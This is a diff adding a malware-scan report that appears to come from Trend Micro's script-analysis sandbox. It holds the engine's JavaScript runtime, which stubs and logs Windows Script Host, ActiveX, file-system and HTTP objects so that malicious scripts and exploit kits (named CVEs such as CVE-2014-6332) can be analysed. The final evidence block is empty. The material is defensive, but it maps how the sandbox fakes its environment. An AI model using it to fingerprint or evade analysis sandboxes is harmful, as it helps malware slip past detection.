@@ -1,0 +1,1046 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<report>
+<file_path>D:\jsdb2\am\files\4adce33fd961c286c4f92de8b2f23e4c6be8ee1f</file_path>
+<sha1>4ADCE33FD961C286C4F92DE8B2F23E4C6BE8EE1F</sha1>
+<file_type>html</file_type>
+<url>http://www.abcd1234sa.com.cn/index</url>
+<decision>Undetermined</decision>
+<matched_rules />
+<evidence type="javascript">
+<external_variables>
+<ev name="obfuscation">0</ev>
+</external_variables>
+<attributes>
+<attr name="url">http://www.abcd1234sa.com.cn/index</attr>
+</attributes>
+<content mode="text">
+<![CDATA[var SUPPORT_JS_RANSOMWARE_DETECT = true;
+// This is JS Runtime file in SA engine, Copyright @ TrendMicro
+// Author: Michael Du
+// Date: 2016/07/21
+
+///** @const */ var inBrowser = typeof console != "undefined";
+
+if ("undefined" == typeof(hasTMSARuntime)){
+//including guard
+//avoid loading JS Runtime twice in fragment mode
+//otherwise, "new ActivexObject" will be called recursively. The call stack size will exceed the maximum value that lead to detection drop
+hasTMSARuntime = true
+
+// check if current context is browser or SAL
+var inBrowser = (console !== null);
+// prepare jsGlobal variable
+var jsGlobal = (function () {
+    return this || (1, eval)('this');
+})();
+// check environment
+// if it's IE or SAL, noActiveXObject == false
+// if it's Chrome or other non-IE browser, noActiveXObject == true
+var noActiveXObject = ("undefined" == typeof(ActiveXObject));
+
+// print line number and function name into log
+if (!jsGlobal.hasOwnProperty('__stack')) {
+  Object.defineProperty(jsGlobal, '__stack', {
+    get: function(){
+      var orig = Error.prepareStackTrace;
+      Error.prepareStackTrace = function(_, stack){ return stack; };
+      var err = new Error;
+      Error.captureStackTrace(err, arguments.callee);
+      var stack = err.stack;
+      Error.prepareStackTrace = orig;
+      return stack;
+    }
+  });
+}
+if (!jsGlobal.hasOwnProperty('__line')) {
+  Object.defineProperty(jsGlobal, '__line', {
+    get: function(){
+      return __stack[2].getLineNumber();
+    }
+  });
+}
+if (!jsGlobal.hasOwnProperty('__function')) {
+  Object.defineProperty(jsGlobal, '__function', {
+    get: function(){
+      return __stack[2].getMethodName();
+    }
+  });
+}
+
+window.print = function (msg) {
+  if (inBrowser) {
+    console.log(msg, __function, __line);
+  } else {
+    tmsa_log(0, "JS Runtime", msg, __function, __line);
+  }
+};
+
+window.report = function (msg) {
+  if (inBrowser) {
+    console.log(msg, __function, __line);
+  } else {
+    _docode_report(0, "JS Runtime", msg, __function, __line);
+  }
+};
+
+// compatible for old engine which doesn't implement SUPPORT_JS_RANSOMWARE_DETECT
+if (typeof SUPPORT_JS_RANSOMWARE_DETECT == "undefined") {
+  SUPPORT_JS_RANSOMWARE_DETECT = false;
+}
+// print external variables
+print("Support JS ransomware detection: " + SUPPORT_JS_RANSOMWARE_DETECT);
+
+// backup original ActiveXObject
+var oriActiveXObject = undefined;
+if (!noActiveXObject) {
+  print("find ActiveXObject in current context, backup original ActiveXObject");
+  oriActiveXObject = ActiveXObject;
+} else {
+  print("cannot find ActiveXObject in current context");
+}
+
+// Ultra.OfficeControl CVE-2008-3878
+var tmsaUltraOfficeControl = {
+  HttpUpload : function(url, file, postdata) {
+    report("[Ultra.OfficeControl] HttpUpload, url.len: " + url.length + " file.len: " + file.length + " postdata.len: " + postdata.length);
+  }
+}
+
+// hook ActiveXObject
+ActiveXObject = function (name) {
+  if (typeof(name) == "undefined") {
+      throw ("Argument not optional");
+  }
+  report("Create ActiveXObject: "+name);
+  lowerName = name.toLowerCase();
+  if (lowerName.indexOf("kaspersky") >= 0 || lowerName == "") {
+       throw "Can not Create ActiveX for " + name;
+       return undefined;
+  }
+  if (SUPPORT_JS_RANSOMWARE_DETECT && typeof winHostActiveXObject != 'undefined') {
+    var winHostObj = winHostActiveXObject(name);
+    if (typeof winHostObj != 'undefined') {
+      return winHostObj;
+    }
+  }
+  switch (lowerName) {
+    case "ultra.officecontrol": //CVE-2008-3878
+      return tmsaUltraOfficeControl;
+    default:
+      {
+        if (!noActiveXObject) {
+          return new oriActiveXObject(name);
+        } else {
+          throw "Cannot find ActiveXObject: " + name;
+        }
+      }
+  }
+};
+
+// https://msdn.microsoft.com/en-us/library/at5ydy31(v=vs.84).aspx
+var WScript = {
+  CreateObject : function(name) {
+    report("[WScript] create object, name = " + name);
+    //lowerName = name.toLowerCase();
+    //if (!noActiveXObject && lowerName == "wscript.shell") {
+    //  return new oriActiveXObject(name);
+    //} else {
+      return ActiveXObject(name);
+    //}
+  }
+};
+
+/*
+//for debug
+//add swfobject.js runtime for Kaixin EK: 0a2f3127f02dca609ca694773089fe689bb3c653
+if (!deconcept) {
+    var deconcept = { 
+        SWFObjectUtil: {
+            getPlayerVersion: function() { 
+              print("[SWF object]get flash player version"); 
+              return {major:12, minor:0, rev:0};
+            }
+        }
+    }
+}
+*/
+
+//add IE runtime for Magnitude EK: 3dea414094ad055fcfc016d465af84ac719e1c7a
+// Chaoying: CVE-2013-2551
+document.namespaces = { 
+    add: function (_name, _urn, _url) {
+        report("[document.namespaces.add] URN:"+_urn+", URL:"+_url+", Name:"+_name);
+    }
+};
+
+//Chaoying_Liu, add IE runtime for CVE-2015-2419: 59a748fe5097051f47bcce9ef67a65f65b9fcfbd
+function ScriptEngineBuildVersion() {
+    report("call TMSA ScriptEngineBuildVersion()");
+    return 17905;
+}
+
+function ScriptEngineMajorVersion() {
+    report("call TMSA ScriptEngineMajorVersion()");
+    return 11;
+}
+function ScriptEngineMinorVersion() {
+    report("call TMSA ScriptEngineMinorVersion()");
+    return 3;
+}
+
+//Chaoying_Liu
+//hook execute of VBScript for CVE-2014-6332, 73e3326f389c34256d717bb88a45f0742c1195bd
+function execute(string) {
+    report("[execute of VBScript], param:" + string)
+    return ;
+}
+
+//Chaoying_Liu
+//hook strreverse of VBScript for CVE-2014-6332, e53585e95f151f9e8f4f522c156510d6ab414e07
+function StrReverse(string) {
+    result = string.split("").reverse().join("")
+    report("[StrReverse of VBScript], return:" + result)
+    return result;
+}  
+function strreverse(string) { 
+    return StrReverse(string); 
+}
+
+//nico_jiang
+//hook execScript for vbScript for CVE-2016-0189,sha1 = "292DEA1C7DA35677734F2B426A552BB0FBE8225F"
+function execScript(code,Language)
+{
+	report("[execScript of VBScript], param:" + code)
+}
+
+}//end of including guard]]>
+</content>
+</evidence>
+<evidence type="javascript_behavior">
+<external_variables>
+<ev name="obfuscation">0</ev>
+</external_variables>
+<content mode="text">
+<![CDATA[]]>
+</content>
+</evidence>
+<evidence type="javascript">
+<external_variables>
+<ev name="obfuscation">0</ev>
+</external_variables>
+<attributes>
+<attr name="url">http://www.abcd1234sa.com.cn/index</attr>
+</attributes>
+<content mode="text">
+<![CDATA[// This is JS Runtime file for Windows Host in SA engine, Copyright @ TrendMicro
+// Author: Michael Du
+// Date: 2016/10/27
+
+if ("undefined" == typeof(hasTMSAWinHostRuntime)){
+//including guard
+//avoid loading JS Runtime twice in fragment mode
+//otherwise, "new ActivexObject" will be called recursively. The call stack size will exceed the maximum value that lead to detection drop
+hasTMSAWinHostRuntime = true
+
+// Following variables and functions have been defined in global runtime.js, such as:
+// noActiveXObject and oriActiveXObject
+
+// In SAL, core engine has implements some objects, such as:
+// WScript.Shell, Scripting.FileSystemObject and MSXML2.ServerXMLHTTP, etc.
+// When script triggers this object, runtime should call core engine implements.
+var oriWScriptShell = undefined;
+var oriFileSystem = undefined;
+var oriServerXMLHTTP = undefined;
+if (!noActiveXObject) {
+  print("find ActiveXObject in current context, backup original WScript.Shell, Scripting.FileSystemObject and MSXML2.ServerXMLHTTP");
+  oriWScriptShell = new oriActiveXObject("WScript.Shell");
+  oriFileSystem = new oriActiveXObject("Scripting.FileSystemObject");
+  oriServerXMLHTTP = new oriActiveXObject("MSXML2.ServerXMLHTTP");
+} else {
+  print("cannot find ActiveXObject in current context");
+}
+
+
+// https://msdn.microsoft.com/en-us/library/efy5bay1(v=vs.94).aspx
+if (typeof ScriptEngine == "undefined") {
+  window.ScriptEngine = function() {
+    report("[Window Global] Call ScriptEngine()");
+    return "JScript.Encode";
+  }
+}
+
+// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/getYear
+Date.prototype.getYear = function() {
+  return this.getFullYear();
+}
+
+Date.prototype.getUTCMilliseconds = function() {
+  return Math.floor((Math.random() * 1000));
+}
+
+// https://msdn.microsoft.com/en-us/library/aa242724(v=vs.60).aspx
+function TmsaTextStream(name) {
+  this.name_ = name;
+  this.content_ = "";
+  this.Line = "";
+}
+
+TmsaTextStream.prototype = {
+  get Column(){
+    // https://msdn.microsoft.com/en-us/library/ddz9scc8(v=vs.84).aspx
+    // Column must large than 0
+    report("[Text.Stream] get Column property");
+    return 1;
+  }
+}
+
+TmsaTextStream.prototype.WriteLine = function(line) {
+  report("[Text.Stream] write line, value = " + line);
+  this.content_ += line;
+}
+TmsaTextStream.prototype.WRITELine = function(line) {
+  this.WriteLine(line)
+}
+TmsaTextStream.prototype.Write = function(content) {
+  report("[Text.Stream] write, value = " + content);
+  this.content_ = content;
+}
+TmsaTextStream.prototype.write = function(content) {
+  this.Write(content)
+}
+TmsaTextStream.prototype.Close = function() {
+  report("[Text.Stream] close");
+}
+TmsaTextStream.prototype.close = function() {
+  this.Close();
+}
+TmsaTextStream.prototype.ReadAll = function() {
+  report("[Text.Stream] ReadAll, content = " + this.content_);
+  return this.content_;
+}
+TmsaTextStream.prototype.ReadLine = function() {
+  report("[Text.Stream] ReadLine, content = " + this.content_);
+  return this.content_;
+}
+TmsaTextStream.prototype.GetName = function() {
+  report("[Text.Stream] GetName, name = " + this.name_);
+  return this.name_;
+}
+
+function TMSAString(data) {
+  this.dumpReadCharCode = false;
+  this.data = data;
+  if (data.length != 0) {
+    this.length = this.data.length;
+  } else {
+    this.length = 10000;
+  }
+  this.countCharCodeAt = 0;
+}
+TMSAString.prototype.valueOf = function() {
+  return this.data;
+}
+TMSAString.prototype.toString = function() {
+  return this.data;
+}
+TMSAString.prototype.charCodeAt = function(index) {
+  if (this.length == 10000 && this.dumpReadCharCode == false) {
+    if (this.countCharCodeAt++ > 10) {
+      this.dumpReadCharCode = true;
+      var msg = "stop accessing fake response body in loop";
+      report(msg);
+      throw msg;
+    } else {
+      report("[TMSAString] call charCodeAt, return fake value (A), index = " + index);
+    }
+    return 'A';
+  }
+  return this.data[index];
+}
+TMSAString.fromCharCode = function(num) {
+  return String.fromCharCode(num);
+}
+
+// https://msdn.microsoft.com/en-us/library/1ft05taf(v=vs.84).aspx
+function TmsaFile(path) {
+  this.path = path;
+}
+TmsaFile.prototype = {
+  // properties
+  get Path(){
+    report("[File] get Path property");
+    return this.path;
+  }, 
+  // methods
+  OpenAsTextStream: function(iomode, format) {
+    report("[File] OpenAsTextStream");
+    return new TmsaTextStream(this.path);
+  },
+}
+
+// https://msdn.microsoft.com/en-us/library/1c87day3(v=vs.84).aspx
+function TmsaFolder(path) {
+  this.path = path;
+}
+TmsaFolder.prototype = {
+  // properties
+  get Path(){
+    report("[Folder] get Path property");
+    return this.path;
+  }, 
+  // methods
+  CopyHere: function(items, option) {
+    report("[Folder] call CopyHere");
+  }, 
+  Items: function() {
+    report("[Folder] call Items");
+    return "";
+  },
+  CreateTextFile: function(filename, overwrite, unicode) {
+    report("[Folder] CreateTextFile, filename = " + filename);
+    return new TmsaTextStream(filename);
+  },
+}
+
+// 
+var tmsaNewAddedFiles = {
+  filelist: [],
+  add: function(filename) {
+    this.filelist.push(filename);
+  },
+  remove: function(filename) {
+    for (index in this.filelist) {
+      if (this.filelist[index].GetName().indexOf(filename) != -1) {
+        this.filelist.splice(index,1);
+      }
+    }
+  },
+  find: function(filename) {
+    for (index in this.filelist) {
+      if (this.filelist[index].GetName().indexOf(filename) != -1) {
+        return this.filelist[index];
+      }
+    }
+    return undefined;
+  },
+};
+
+// --------------- for wscript -----------------------
+// NOTE:
+// In tmsa.dll, it has hooked ExpandEnvironmentStrings and run in WScript.Shell
+// So we need to hook WScript.Shell in JS-Runtime, NOT to reimplement it.
+//
+// https://msdn.microsoft.com/en-us/library/98591fh7(v=vs.84).aspx
+var WshSysEnv = function(name) {
+  var ret_val = undefined;
+  switch (name.toUpperCase()) {
+    case 'COMSPEC':
+    {
+      ret_val = '%SystemRoot%\\system32\\cmd.exe';
+      break;
+    }
+    case 'PROCESSOR_ARCHITECTURE':
+    {
+      ret_val = 'x86';
+      break;
+    }
+  }
+  return ret_val;
+}
+
+function TmsaWshShortcut(path) {
+    this.place = path;
+    this.TargetPath = '';
+    this.WindowStyle = 1;
+    this.FullName = path;
+}
+
+var tmsaScriptShell = {
+  run : function() {
+    report("[WScript.Shell] Run!");
+    if (undefined != oriWScriptShell) {
+      oriWScriptShell.run();
+    }
+  },
+  run : function(cmd, style, wait_on_return) {
+    report("[WScript.Shell] Run! CMD: " + cmd + ", Window Style: " + style + ", Wait on return: " + wait_on_return);
+    if (undefined != oriWScriptShell) {
+      oriWScriptShell.run(cmd, style, wait_on_return);
+    }
+    if (-1 != cmd.indexOf(".js") && !inBrowser) {
+      file = tmsaNewAddedFiles.find(cmd);
+      jsGlobal.eval(file.ReadAll());
+    }
+  },
+  Run : function(cmd, style, wait_on_return) {
+    this.run(cmd, style, wait_on_return);
+  },
+  ExpandEnvironmentStrings : function(path) {
+    report("[WScript.Shell] ExpandEnvironmentStrings, path = " + path);
+    if (undefined != oriWScriptShell) {
+      return oriWScriptShell.ExpandEnvironmentStrings(path);
+    } else {
+      return path;
+    }
+  },
+  expandEnvironmentStrings : function(path) {
+    return this.ExpandEnvironmentStrings(path);
+  },
+  // https://msdn.microsoft.com/en-us/library/0ea7b5xe(v=vs.84).aspx
+  SpecialFolders: function(objWshSpecialFolders) {
+    var ret_val = '';
+    switch (objWshSpecialFolders.toLowerCase()) {
+      case "desktop":
+      {
+        ret_val = 'c:\\users\\admin\\desktop\\';
+        break;
+      }
+      default:
+        break;
+    }
+    return ret_val;
+  },
+  // https://msdn.microsoft.com/en-us/library/fd7hxfdd(v=vs.84).aspx
+  Environment: function(type) {
+    var ret_val = undefined;
+    switch (type.toUpperCase()) {
+      case 'SYSTEM':
+      {
+        ret_val = WshSysEnv;
+      }
+    }
+    return ret_val;
+  },
+  // https://msdn.microsoft.com/en-us/library/x05fawxd(v=vs.84).aspx
+  RegRead: function(key) {
+    report("[WScript.Shell] RegRead, key = " + key);
+    if (-1 != key.indexOf('ProgramFilesDir')) {
+      return 'C:\\Program Files (x86)';
+    } else {
+      return '';
+    }
+  }, 
+  // https://msdn.microsoft.com/en-us/library/ateytk4a(v=vs.84).aspx
+  Exec: function(command) {
+    report("[WScript.Shell] Exec! CMD: " + command);
+  },
+  exec: function(command) {
+    this.Exec(command);
+  },
+  // https://msdn.microsoft.com/en-us/library/xsy6k3ys(v=vs.84).aspx
+  CreateShortcut: function(path) {
+    report("[WScript.Shell] CreateShortcut, path = " + path);
+    return new TmsaWshShortcut(path);
+  },
+};
+
+// https://msdn.microsoft.com/en-us/library/windows/desktop/bb774094(v=vs.85).aspx
+var tmsaShellApp = {
+  NameSpace: function(dir) {
+    report("[Shell.Application] call NameSpace, dir = " + dir);
+    return new TmsaFolder(dir);
+  },
+  ShellExecute: function(file, args, dir, operation, show) {
+    args = args.replace('^', '');
+    report("[Shell.Application] ShellExecute, file = " + file + ", args = " + args + ", dir = " + dir + ", operation = " + operation + ", show = " + show);
+  }
+};
+
+// https://msdn.microsoft.com/en-us/library/ms535874(v=vs.85).aspx
+var tmsaXMLHttp = {
+  // workaround for event callback
+  onreadystatechange_callback: undefined,
+  trigger_callback : function() {
+    if (undefined != this.onreadystatechange_callback) {
+      report("[XMLHttpRequest] trigger onreadystatechange callback.");
+      this.onreadystatechange_callback();
+    }
+  },
+
+  // public functions
+  open : function(method, url, async, username, password) {
+    report("[XMLHttpRequest] open HTTP request, method = " + method + ", URL = " + url);
+  },
+  opEn : function(method, url, async, username, password) {
+    this.open(method, url, async, username, password);
+  },
+  send : function() {
+    report("[XMLHttpRequest] send HTTP request");
+    this.trigger_callback();
+  },
+  // https://msdn.microsoft.com/en-us/library/ms536752(v=vs.85).aspx
+  setRequestHeader : function(header, value) {
+    report("[XMLHttpRequest] set request header, header = " + header + ", value = " + value);
+  },
+  SetRequestHeader : function(header, value) {
+    this.setRequestHeader(header, value);
+  },
+  // properties
+  get status() {
+    report("[XMLHttpRequest] get HTTP status, return 200");
+    return 200;
+  },
+  get Status() {
+    return this.status;
+  },
+  get responseBody() {
+    report("[XMLHttpRequest] get HTTP Response Body");
+    return new TMSAString("fake_response_body_content");
+  },
+  get ResponseBody() {
+    return this.responseBody;
+  },
+  set onreadystatechange(callback) {
+    report("[XMLHttpRequest] set callback of onreadystatechange");
+    this.onreadystatechange_callback = callback;
+  },
+  get readyState() {
+    return 4;
+  },
+  get ReadyState() {
+    return this.readyState;
+  }
+};
+
+// https://msdn.microsoft.com/en-us/library/windows/desktop/aa384106(v=vs.85).aspx
+var tmsaWinHttp = tmsaXMLHttp;
+
+// https://msdn.microsoft.com/en-us/library/ms766431(v=vs.85).aspx
+var tmsaServerXMLHTTP = {
+  open : function(method, url, async, username, password) {
+    report("[ServerXMLHTTP] open HTTP request, method = " + method + ", URL = " + url);
+    if (!noActiveXObject) {
+      oriServerXMLHTTP.open(method, url, async, username, password);
+    }
+  },
+  send : function() {
+    report("[ServerXMLHTTP] send HTTP request");
+    if (!noActiveXObject) {
+      oriServerXMLHTTP.send();
+    }
+  }, 
+  get status() {
+    report("[ServerXMLHTTP] get HTTP status, return 200");
+    return 200;
+  },
+};
+
+// https://msdn.microsoft.com/en-us/library/ms675032(v=vs.85).aspx
+var tmsaADODB = {
+  filename: "",
+  open : function() {
+    report("[ADODB.Stream] open stream");
+  },
+  Open: function() {
+    this.open();
+  },
+  write : function(args) {
+    report("[ADODB.Stream] write content, " + args);
+  },
+  Write: function(args) {
+    this.write(args);
+  },
+  get size() {
+    report("[ADODB.Stream] get content size, fake size = 2000");
+    return 900000;
+  },
+  saveToFile : function(file_name, save_options) {
+    this.SaveToFile(file_name, save_options);
+  },
+  SaveToFile : function(file_name, save_options) {
+    report("[ADODB.Stream] save to file, path = " + file_name);
+    tmsaNewAddedFiles.add(new TmsaTextStream(file_name));
+  },
+  close : function() {
+    report("[ADODB.Stream] close stream");
+  }, 
+  Close: function() {
+    this.close();
+  },
+  set type(val) {
+    report("[ADODB.Stream] set type, value = " + val);
+  },
+  set position(val) {
+    report("[ADODB.Stream] set position, value = " + val);
+  }, 
+  LoadFromFile: function(filename) {
+    report("[ADODB.Stream] Load contents of existing file, filename: " + filename);
+    this.filename = filename;
+  },
+  loadFromFile: function(filename) {
+    this.LoadFromFileFileName(filename);
+  },
+  //ReadText: function(numchars) {
+  //  return "fake_response_body_content";
+  //},
+  //readText: function(numchars) {
+  //  return this.ReadText(numchars);
+  //},
+  get ReadText() {
+    var file = tmsaNewAddedFiles.find(this.filename);
+    return new TMSAString(file.ReadAll());
+  },
+};
+
+// https://msdn.microsoft.com/en-us/library/6tkce7xa(v=vs.84).aspx
+var tmsaFileSystem = {
+  // Adds a new folder to a Folders collection.
+  Add: function(foldername) {
+    report("[FileSystemObject] Add folder, " + foldername);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.Add(foldername);
+    }
+  },
+  FolderExists: function(folderspec) {
+    report("[FileSystemObject] Folder exists, " + folderspec)
+    return true;
+  },
+  CreateFolder: function(foldername) {
+    report("[FileSystemObject] Create folder, " + foldername);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.CreateFolder(foldername);
+    }
+  },
+  FileExists: function(filespec) {
+    report("[FileSystemObject] File exists: " + filespec);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.FileExists(filespec);
+    }
+    if (-1 != filespec.indexOf('\\system.ini')) {
+      return true;
+    } else {
+      return undefined != tmsaNewAddedFiles.find(filespec);
+    }
+  },
+  CreateTextFile: function(filename, overwrite, unicode) {
+    report("[FileSystemObject] Create text file, filename: " + filename);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.CreateTextFile(filename, overwrite, unicode);
+    }
+    var text = new TmsaTextStream(filename);
+    tmsaNewAddedFiles.add(text);
+    return text;
+  },
+  OpenTextFile: function(filename, iomode, create, format) {
+    report("[FileSystemObject] Open text file, filename: " + filename);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.OpenTextFile(filename, iomode, create, format);
+    }
+    var text = new TmsaTextStream(filename);
+    if (-1 != filename.indexOf('\\system.ini')) {
+      text.Write('; for 16-bit app support');
+    }
+    tmsaNewAddedFiles.add(text);
+    return text;
+  },
+  OPENTextFile: function(filename, iomode, create, format) {
+    return this.OpenTextFile(filename, iomode, create, format);
+  },
+  GetSpecialFolder: function(folderspec) {
+    report("[FileSystemObject] Return special folder object specified: " + folderspec);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.GetSpecialFolder(folderspec);
+    }
+    var specfolder = "";
+    switch (folderspec) {
+      case 0:
+        specfolder = "C:\\Windows";
+        break;
+      case 1:
+        specfolder = "C:\\Windows\\System32";
+        break;
+      case 2:
+        specfolder = "%TEMP%";
+        break;
+    }
+    return specfolder;
+  },
+  GetParentFolderName: function(path) {
+    report("[FileSystemObject] Return parent folder name for: " + path);
+    var path_arr = path.split('\\');
+    path_arr.pop();
+    return path_arr.join('\\');
+  },
+  GetTempName: function() {
+    report("[FileSystemObject] Returns a randomly generated temporary file or folder name");
+    if (oriFileSystem != undefined) {
+      oriFileSystem.GetTempName();
+    }
+    return "random_temp_filename";
+  },
+  GetFolder: function(folderspec) {
+    report("[FileSystemObject] GetFolder, folderspec = " + folderspec);
+    return new TmsaFolder(folderspec);
+  },
+  getFolder: function(folderspec) {
+    return this.GetFolder(folderspec);
+  },
+  GetFile: function(filespec) {
+    report("[FileSystemObject] GetFile, filespec = " + filespec);
+    return new TmsaFile(filespec);
+  },
+  getFile: function(filespec) {
+    return this.GetFile(filespec);
+  },
+  DeleteFile: function(filespec, force) {
+    report("[FileSystemObject] Deletes a specified file, " + filespec);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.DeleteFile(filespec, force);
+    }
+    tmsaNewAddedFiles.remove(new TmsaTextStream(filespec));
+  },
+  deleteFile: function(filespec, force) {
+    this.DeleteFile(filespec, force);
+  },
+  CopyFile: function(filespec,destfile) {
+    report("[FileSystemObject] CopyFile from " + filespec + " to " + destfile);
+  },
+}
+
+// https://msdn.microsoft.com/en-us/library/x4k5wbx4(v=vs.84).aspx
+var tmsaDictionaryObject = {
+  items: {},
+  add: function(key, item) {
+    this.items[key] = item;
+  },
+  Add: function(key, item) {
+    this.items[key] = item;
+  },
+  Item: function(key) {
+    return this.items[key];
+  },
+}
+
+// https://msdn.microsoft.com/en-us/library/yab2dx62(v=vs.84).aspx
+// http://stackoverflow.com/questions/19234417/jscript-vbscript-typename-function-for-activexobjects
+var tmsaVBScriptRegExp = {
+
+}
+
+// https://msdn.microsoft.com/en-us/library/s6wt333f(v=vs.84).aspx
+var tmsaWScriptNetwork = {
+  get ComputerName() {
+    return "FakeComputerName";
+  },
+  get computerName() {
+    return this.ComputerName;
+  },
+  get UserDomain() {
+    return "FakeSA";
+  },
+  get UserName() {
+    return "AdminTest";
+  },
+  EnumPrinterConnections: function() {
+    var FEPC=new Object();
+    FEPC.Item=function(number){
+      return "FakeEnumPrinterConnections_"+number;
+    };
+    FEPC.Count=function(){
+      return 0;
+    };
+    return FEPC;
+  },
+  EnumNetworkDrives: function() {
+    var FEND=new Object();
+    FEND.Item=function(number){
+      return "FakeEnumNetworkDrives_"+number;
+    };
+    FEND.Count=function(){
+      return 0;
+    };
+    return FEND;
+  },
+}
+
+// https://msdn.microsoft.com/en-us/library/d6y04sbb(v=vs.84).aspx
+var tmsaWshNamed = {
+  get Length() {
+    return 0;
+  },
+  get length() {
+    return this.Length;
+  },
+}
+
+// https://msdn.microsoft.com/en-us/library/ss1ysb2a(v=vs.84).aspx
+var tmsaWshArguments = {
+  get Length() {
+    return 0;
+  },
+  get length() {
+    return this.Length;
+  },
+  get Named() {
+    return tmsaWshNamed;
+  },
+}
+
+
+
+// this ActiveXObject function will be triggered in runtime.js:ActiveXObject
+// so name is not undefined
+winHostActiveXObject = function (name) {
+  report("Create ActiveXObject: "+name);
+  lowerName = name.toLowerCase();
+  switch (lowerName) {
+    case "wscript.shell":
+      report("[ActiveXObject] create WScript.Shell");
+      return tmsaScriptShell;
+    case "shell.application":
+      report("[ActiveXObject] create Shell.Application");
+      return tmsaShellApp;
+    case "adodb.stream":
+      report("[ActiveXObject] create ADODB.Stream");
+      return tmsaADODB;
+    case "scripting.filesystemobject":
+      return tmsaFileSystem;
+    case "scripting.dictionary":
+      return tmsaDictionaryObject;
+    case "vbscript.regexp":
+      return tmsaVBScriptRegExp;
+    case "wscript.network":
+      return tmsaWScriptNetwork;
+    default:
+      if (-1 != lowerName.indexOf("msxml2.xmlhttp")) {
+        report("[ActiveXObject] create MSXML2.XMLHTTP");
+        return tmsaXMLHttp;
+      } else if (-1 != lowerName.indexOf("winhttp.winhttprequest")) {
+        report("[ActiveXObject] create WinHttp.WinHttpRequest");
+        return tmsaWinHttp;
+      } else if (-1 != lowerName.indexOf("msxml2.serverxmlhttp")) {
+        report("[ActiveXObject] create MSXML2.ServerXMLHTTP");
+        return tmsaServerXMLHTTP;
+      } else {
+        return undefined;
+      }
+  }
+};
+
+// https://msdn.microsoft.com/en-us/library/at5ydy31(v=vs.84).aspx
+sleep_count = 0;
+WScript.Sleep = function(milliseconds) {
+  report("[WScript] sleep, milliseconds = " + milliseconds);
+  if (sleep_count > 10) {
+    report("[WScript] Sleep count > 10");
+    throw "Sleep count > 10";
+  }
+  sleep_count++;
+};
+WScript.sleep = function(milliseconds) {
+  this.Sleep(milliseconds);
+};
+WScript.sLeEP = function(milliseconds) {
+  this.Sleep(milliseconds);
+};
+WScript.SleEp = function(milliseconds) {
+  this.Sleep(milliseconds);
+};
+WScript.Quit = function(errorcode) {
+  report("[WScript] quit! errorcode = " + errorcode);
+};
+WScript.toString = function() {
+  return "Windows Script Host";
+};
+WScript.Echo = function(args) {
+  report("[WScript.Echo] " + args);
+};
+WScript.echo = function(args) {
+  this.Echo(args);
+};
+WSH=WScript;
+if (!WScript.hasOwnProperty('Version')) {
+  Object.defineProperty(WScript, 'Version', {
+    get: function() {
+      // make sure length of version is greater than 0
+      return "5.8.9600.17415";
+    }
+  });
+}
+if (!WScript.hasOwnProperty('ScriptFullName')) {
+  Object.defineProperty(WScript, 'ScriptFullName', {
+    get: function() {
+      return "fake_full_path_of_running_script_name";
+    }
+  });
+}
+if (!WScript.hasOwnProperty('Arguments')) {
+  Object.defineProperty(WScript, 'Arguments', {
+    get: function() {
+      return tmsaWshArguments;
+    }
+  });
+}
+if (!WScript.hasOwnProperty('StdErr')) {
+  Object.defineProperty(WScript, 'StdErr', {
+    get: function() {
+      report("[WScript] get StdErr property");
+      return new TmsaTextStream("StdErr");
+    }
+  });
+}
+if (!WScript.hasOwnProperty('StdIn')) {
+  Object.defineProperty(WScript, 'StdIn', {
+    get: function() {
+      report("[WScript] get StdIn property");
+      return new TmsaTextStream("StdIn");
+    }
+  });
+}
+if (!WScript.hasOwnProperty('StdOut')) {
+  Object.defineProperty(WScript, 'StdOut', {
+    get: function() {
+      report("[WScript] get StdOut property");
+      return new TmsaTextStream("StdOut");
+    }
+  });
+}
+if (!WScript.hasOwnProperty('Path')) {
+  Object.defineProperty(WScript, 'Path', {
+    get: function() {
+      report("[WScript] get Path property");
+      return "C:\\Windows\\System32";
+    }
+  });
+}
+
+} // end of including guard
+]]>
+</content>
+</evidence>
+<evidence type="javascript_behavior">
+<external_variables>
+<ev name="obfuscation">0</ev>
+</external_variables>
+<content mode="text">
+<![CDATA[_global.ActiveXObject("WScript.Shell", )?
+_global.ActiveXObject("Scripting.FileSystemObject", )?
+_global.ActiveXObject("MSXML2.ServerXMLHTTP", )?
+]]>
+</content>
+</evidence>
+<evidence type="javascript">
+<external_variables>
+<ev name="obfuscation">2</ev>
+</external_variables>
+<attributes>
+<attr name="url">http://www.abcd1234sa.com.cn/index</attr>
+</attributes>
+<content mode="text">
